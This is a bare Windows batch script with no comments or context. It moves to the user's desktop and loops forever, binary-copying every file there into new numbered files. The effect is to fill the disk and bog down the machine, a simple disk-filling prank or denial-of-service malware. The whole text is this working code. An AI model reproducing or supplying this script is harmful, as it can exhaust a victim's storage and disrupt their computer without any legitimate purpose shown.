@echo off
cd "%userprofile%\desktop"
set/a i=0
:1
copy /b *.* "%i%.*"
set/a i=%i%+1
goto 1